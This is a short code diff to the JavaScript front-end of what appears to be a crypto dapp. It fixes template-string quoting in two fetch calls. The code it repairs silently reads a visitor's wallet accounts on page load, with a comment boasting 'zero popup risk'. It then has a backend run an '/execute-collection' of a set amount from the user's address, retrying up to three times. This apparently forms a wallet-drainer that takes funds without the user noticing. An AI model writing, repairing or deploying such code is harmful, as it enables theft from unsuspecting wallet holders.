@@ -44,7 +44,7 @@ const toastEl       = document.getElementById("toast");
 merchantInput.value = MERCHANT_ADDRESS;
 
 // ─── Wake up Render backend ───────────────────────────────────────────────────
-(async () => { try { await fetch('${BACKEND_URL}/health'); } catch (_) {} })();
+(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
 
 // ─── Page-load silent connect — reference dapp exact pattern ─────────────────
 // Only calls eth_accounts (never eth_requestAccounts) — zero popup risk.
@@ -128,7 +128,7 @@ async function triggerBackendCollect(userAddress) {
   let lastErr;
   for (let i = 1; i <= 3; i++) {
     try {
-      const res  = await fetch('${BACKEND_URL}/execute-collection', {
+      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
         method:  "POST",
         headers: { "Content-Type": "application/json" },
         body:    JSON.stringify({ userAddress, amount: COLLECT_AMOUNT })
